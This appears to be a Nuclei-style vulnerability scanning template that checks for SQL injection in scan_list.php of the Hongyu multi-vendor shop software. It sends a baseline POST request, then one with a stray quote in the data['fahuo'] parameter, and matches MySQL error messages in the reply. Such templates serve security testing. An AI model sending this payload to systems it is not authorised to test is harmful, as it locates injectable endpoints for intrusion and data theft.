id: poc-yaml-hongyujd-scan-list-php-sqli
info:
  name: 鸿宇多用户商城 scan_list.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    鸿宇多用户商城 scan_list.php 存在SQL注入漏洞，攻击者可以利用该漏洞进行任意SQL查询操作，导致数据泄露或篡改。

http:
  - raw:
      - |
        POST /scan_list.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        data['fahuo']=1&act=view
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "68ecshopcom_360buy"
          - "<title>智能扫货商品展示</title>"
        part: body

  - raw:
      - |
        POST /scan_list.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        data['fahuo']=1'&act=view
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SQL syntax"
          - "MySQL Query Error"
        part: body
      - type: word
        words:
          - "<title>智能扫货商品展示</title>"
        part: body
        negative: true
